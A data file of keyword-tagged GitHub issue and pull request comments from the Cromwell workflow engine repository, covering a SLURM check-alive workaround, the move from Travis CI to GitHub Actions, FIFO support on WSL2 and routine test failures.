https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:220,Availability,error,error,220,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093
https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:263,Availability,alive,alive,263,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093
https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:325,Availability,alive,alive,325,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093
https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:483,Availability,error,error,483,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093
https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:625,Availability,alive,alive,625,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093
https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:712,Availability,alive,alive,712,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093
https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:766,Availability,alive,alive,766,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093
https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:897,Availability,error,error,897,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093
https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:149,Modifiability,config,config,149,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093
https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:156,Modifiability,Config,ConfigAsyncJobExecutionActor,156,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093
https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:270,Modifiability,variab,variable,270,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093
https://github.com/broadinstitute/cromwell/pull/6990#issuecomment-1405233346:171,Deployability,install,install,171,"> I see a warning when this runs: `Node.js 12 actions are deprecated...`. Looking into this. . It stems from the fact that we're using the olafurpg (sic) github action to install scala on the VM for us. That action/repo looks a bit stale, so I'm looking into better/newer ways to get java/sbt installed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6990#issuecomment-1405233346
https://github.com/broadinstitute/cromwell/pull/6990#issuecomment-1405233346:293,Deployability,install,installed,293,"> I see a warning when this runs: `Node.js 12 actions are deprecated...`. Looking into this. . It stems from the fact that we're using the olafurpg (sic) github action to install scala on the VM for us. That action/repo looks a bit stale, so I'm looking into better/newer ways to get java/sbt installed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6990#issuecomment-1405233346
https://github.com/broadinstitute/cromwell/pull/6990#issuecomment-1405500533:12,Deployability,install,installing,12,Resolved by installing Java with a more mainstream and supported github action.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6990#issuecomment-1405500533
https://github.com/broadinstitute/cromwell/pull/6992#issuecomment-1412714284:592,Safety,safe,safe,592,"The TravisCI test is not passing or finishing, but I am going to bypass that protection and merge anyway. Talked about it with the team: current theory has to do with the fact that Travis is hung up on testing an old branch name (`travis_to_workflows_test`) that this PR's branch (`sbt_unit_tests`) was branched from. Alternatively, it could be due to the fact that I am new and might not have some sort of account set up in Travis. Another theory is that Travis can't handle the fact that no cromwell code was changed in this branch. . Anyway....this is only github specific stuff so deemed safe to merge.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6992#issuecomment-1412714284
https://github.com/broadinstitute/cromwell/pull/6992#issuecomment-1412714284:13,Testability,test,test,13,"The TravisCI test is not passing or finishing, but I am going to bypass that protection and merge anyway. Talked about it with the team: current theory has to do with the fact that Travis is hung up on testing an old branch name (`travis_to_workflows_test`) that this PR's branch (`sbt_unit_tests`) was branched from. Alternatively, it could be due to the fact that I am new and might not have some sort of account set up in Travis. Another theory is that Travis can't handle the fact that no cromwell code was changed in this branch. . Anyway....this is only github specific stuff so deemed safe to merge.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6992#issuecomment-1412714284
https://github.com/broadinstitute/cromwell/pull/6992#issuecomment-1412714284:202,Testability,test,testing,202,"The TravisCI test is not passing or finishing, but I am going to bypass that protection and merge anyway. Talked about it with the team: current theory has to do with the fact that Travis is hung up on testing an old branch name (`travis_to_workflows_test`) that this PR's branch (`sbt_unit_tests`) was branched from. Alternatively, it could be due to the fact that I am new and might not have some sort of account set up in Travis. Another theory is that Travis can't handle the fact that no cromwell code was changed in this branch. . Anyway....this is only github specific stuff so deemed safe to merge.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6992#issuecomment-1412714284
https://github.com/broadinstitute/cromwell/pull/6993#issuecomment-1412302194:60,Security,access,access,60,@aednichols Would you be able to merge? I do not have write access. Thanks for any help!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6993#issuecomment-1412302194
https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416398044:31,Availability,reliab,reliable,31,"Desktop Docker is not the most reliable platform for real work in Cromwell, but it is interesting that a specific version broke it. Do you have time to do a `git bisect` between 55 and current?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416398044
https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416431366:79,Availability,reliab,reliable,79,"What do you recommend instead on a personal laptop? Even 55 by the way is; not reliable and fails or stucks randomly. I feel like it is more of a; macOS issue, as I never had these on Ubuntu using same setup. 4 Şub 2023 Cmt 00:01 tarihinde Adam Nichols ***@***.***> şunu; yazdı:. > Desktop Docker is not the most reliable platform for real work in; > Cromwell, but it is interesting that a specific version broke it.; >; > Do you have time to do a git bisect between 55 and current?; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416398044>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AHAHMHBVIQIXGMY5RKKIW7TWVVW37ANCNFSM6AAAAAAUQB7A2U>; > .; > You are receiving this because you authored the thread.Message ID:; > ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416431366
https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416431366:313,Availability,reliab,reliable,313,"What do you recommend instead on a personal laptop? Even 55 by the way is; not reliable and fails or stucks randomly. I feel like it is more of a; macOS issue, as I never had these on Ubuntu using same setup. 4 Şub 2023 Cmt 00:01 tarihinde Adam Nichols ***@***.***> şunu; yazdı:. > Desktop Docker is not the most reliable platform for real work in; > Cromwell, but it is interesting that a specific version broke it.; >; > Do you have time to do a git bisect between 55 and current?; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416398044>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AHAHMHBVIQIXGMY5RKKIW7TWVVW37ANCNFSM6AAAAAAUQB7A2U>; > .; > You are receiving this because you authored the thread.Message ID:; > ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416431366
https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416431366:814,Integrability,Message,Message,814,"What do you recommend instead on a personal laptop? Even 55 by the way is; not reliable and fails or stucks randomly. I feel like it is more of a; macOS issue, as I never had these on Ubuntu using same setup. 4 Şub 2023 Cmt 00:01 tarihinde Adam Nichols ***@***.***> şunu; yazdı:. > Desktop Docker is not the most reliable platform for real work in; > Cromwell, but it is interesting that a specific version broke it.; >; > Do you have time to do a git bisect between 55 and current?; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416398044>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AHAHMHBVIQIXGMY5RKKIW7TWVVW37ANCNFSM6AAAAAAUQB7A2U>; > .; > You are receiving this because you authored the thread.Message ID:; > ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416431366
https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416447360:14,Energy Efficiency,schedul,scheduler,14,"Cromwell is a scheduler at heart and wants to dispatch jobs to a backend that it doesn't manage, like cloud or HPC. You may have better results with [MiniWDL](https://github.com/chanzuckerberg/miniwdl) for the jobs-on-laptop use case.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6998#issuecomment-1416447360
https://github.com/broadinstitute/cromwell/issues/6999#issuecomment-1416832647:283,Availability,error,error,283,"Can you post your WDL? Searching for `The label in the input is too long` on the 'net suggests that the HTTP resolver is being passed a domain that is too long. I suppose it's possible that you aren't even using HTTP inputs, but when we try all resolvers and the HTTP one fails, the error is not handled correctly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6999#issuecomment-1416832647
https://github.com/broadinstitute/cromwell/issues/7002#issuecomment-1464352810:204,Testability,test,testfifo,204,"Is your `cromwell-executions` directory on a file system that does not support FIFOs (named pipes)? Windows NTFS file systems mounted to WSL2 do not support FIFOs. For example:. ```; $ mkfifo /mnt/c/Temp/testfifo; mkfifo: cannot create fifo '/mnt/c/Temp/testfifo': Operation not supported; ```. While an ext4 file system does:. ```; $ mkfifo /tmp/testfifo; $ file /tmp/testfifo; /tmp/testfifo: fifo (named pipe); ```. If this is the problem, then the solution would be to place the `cromwell-executions` directory on a file system where FIFOs are supported, if running workflows that need them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7002#issuecomment-1464352810
https://github.com/broadinstitute/cromwell/issues/7002#issuecomment-1464352810:254,Testability,test,testfifo,254,"Is your `cromwell-executions` directory on a file system that does not support FIFOs (named pipes)? Windows NTFS file systems mounted to WSL2 do not support FIFOs. For example:. ```; $ mkfifo /mnt/c/Temp/testfifo; mkfifo: cannot create fifo '/mnt/c/Temp/testfifo': Operation not supported; ```. While an ext4 file system does:. ```; $ mkfifo /tmp/testfifo; $ file /tmp/testfifo; /tmp/testfifo: fifo (named pipe); ```. If this is the problem, then the solution would be to place the `cromwell-executions` directory on a file system where FIFOs are supported, if running workflows that need them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7002#issuecomment-1464352810
https://github.com/broadinstitute/cromwell/issues/7002#issuecomment-1464352810:347,Testability,test,testfifo,347,"Is your `cromwell-executions` directory on a file system that does not support FIFOs (named pipes)? Windows NTFS file systems mounted to WSL2 do not support FIFOs. For example:. ```; $ mkfifo /mnt/c/Temp/testfifo; mkfifo: cannot create fifo '/mnt/c/Temp/testfifo': Operation not supported; ```. While an ext4 file system does:. ```; $ mkfifo /tmp/testfifo; $ file /tmp/testfifo; /tmp/testfifo: fifo (named pipe); ```. If this is the problem, then the solution would be to place the `cromwell-executions` directory on a file system where FIFOs are supported, if running workflows that need them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7002#issuecomment-1464352810
https://github.com/broadinstitute/cromwell/issues/7002#issuecomment-1464352810:369,Testability,test,testfifo,369,"Is your `cromwell-executions` directory on a file system that does not support FIFOs (named pipes)? Windows NTFS file systems mounted to WSL2 do not support FIFOs. For example:. ```; $ mkfifo /mnt/c/Temp/testfifo; mkfifo: cannot create fifo '/mnt/c/Temp/testfifo': Operation not supported; ```. While an ext4 file system does:. ```; $ mkfifo /tmp/testfifo; $ file /tmp/testfifo; /tmp/testfifo: fifo (named pipe); ```. If this is the problem, then the solution would be to place the `cromwell-executions` directory on a file system where FIFOs are supported, if running workflows that need them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7002#issuecomment-1464352810
https://github.com/broadinstitute/cromwell/issues/7002#issuecomment-1464352810:384,Testability,test,testfifo,384,"Is your `cromwell-executions` directory on a file system that does not support FIFOs (named pipes)? Windows NTFS file systems mounted to WSL2 do not support FIFOs. For example:. ```; $ mkfifo /mnt/c/Temp/testfifo; mkfifo: cannot create fifo '/mnt/c/Temp/testfifo': Operation not supported; ```. While an ext4 file system does:. ```; $ mkfifo /tmp/testfifo; $ file /tmp/testfifo; /tmp/testfifo: fifo (named pipe); ```. If this is the problem, then the solution would be to place the `cromwell-executions` directory on a file system where FIFOs are supported, if running workflows that need them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7002#issuecomment-1464352810
https://github.com/broadinstitute/cromwell/pull/7012#issuecomment-1433720090:40,Testability,test,tests,40,"I missed a one-liner that enabled these tests to work with databases other than mySQL when running on Github Actions. I added a line to include Github Actions, and added the `centaurLocal (mariaDB 10.3)`, `centaurLocal(postgreSQL 11.3)`, and `centaurEngingeUpgradeLocal(mySQL 5.7)` tests now that they work again. . These tests are referenced in tickets WX-934 and WX-920.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7012#issuecomment-1433720090
https://github.com/broadinstitute/cromwell/pull/7012#issuecomment-1433720090:282,Testability,test,tests,282,"I missed a one-liner that enabled these tests to work with databases other than mySQL when running on Github Actions. I added a line to include Github Actions, and added the `centaurLocal (mariaDB 10.3)`, `centaurLocal(postgreSQL 11.3)`, and `centaurEngingeUpgradeLocal(mySQL 5.7)` tests now that they work again. . These tests are referenced in tickets WX-934 and WX-920.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7012#issuecomment-1433720090
https://github.com/broadinstitute/cromwell/pull/7012#issuecomment-1433720090:322,Testability,test,tests,322,"I missed a one-liner that enabled these tests to work with databases other than mySQL when running on Github Actions. I added a line to include Github Actions, and added the `centaurLocal (mariaDB 10.3)`, `centaurLocal(postgreSQL 11.3)`, and `centaurEngingeUpgradeLocal(mySQL 5.7)` tests now that they work again. . These tests are referenced in tickets WX-934 and WX-920.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7012#issuecomment-1433720090
https://github.com/broadinstitute/cromwell/pull/7019#issuecomment-1446604338:21,Testability,test,test,21,"FYI, from the failed test:; > The file docs/api/RESTAPI.md is not up to date. Please run: sbt generateRestApiDocs",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7019#issuecomment-1446604338
https://github.com/broadinstitute/cromwell/issues/7021#issuecomment-1447536655:56,Testability,test,tested,56,"Sorry that I forgot to include Cromwell versions.; I've tested on a local Cromwell server, version 63, and on Terra. Both give the same behavior.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7021#issuecomment-1447536655
https://github.com/broadinstitute/cromwell/pull/7024#issuecomment-1470726062:220,Modifiability,Config,Config,220,"For the reviewer, there are two things happening in this PR: ; 1.) There is a new Centaur test that tests reading/writing from Azure Blob Storage; 2.) There is some new plumbing that allows ^^ to use a specialized Azure Config while running in CI",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7024#issuecomment-1470726062
https://github.com/broadinstitute/cromwell/pull/7024#issuecomment-1470726062:90,Testability,test,test,90,"For the reviewer, there are two things happening in this PR: ; 1.) There is a new Centaur test that tests reading/writing from Azure Blob Storage; 2.) There is some new plumbing that allows ^^ to use a specialized Azure Config while running in CI",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7024#issuecomment-1470726062
https://github.com/broadinstitute/cromwell/pull/7024#issuecomment-1470726062:100,Testability,test,tests,100,"For the reviewer, there are two things happening in this PR: ; 1.) There is a new Centaur test that tests reading/writing from Azure Blob Storage; 2.) There is some new plumbing that allows ^^ to use a specialized Azure Config while running in CI",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7024#issuecomment-1470726062
https://github.com/broadinstitute/cromwell/pull/7083#issuecomment-1452452381:27,Testability,test,test,27,"Haha, I see that the Slurm test failed on Travis! Can we remove it from Travis as part of this PR?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7083#issuecomment-1452452381
https://github.com/broadinstitute/cromwell/pull/7083#issuecomment-1452547256:29,Testability,test,test,29,"> Haha, I see that the Slurm test failed on Travis! Can we remove it from Travis as part of this PR?. Good idea. Done.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7083#issuecomment-1452547256
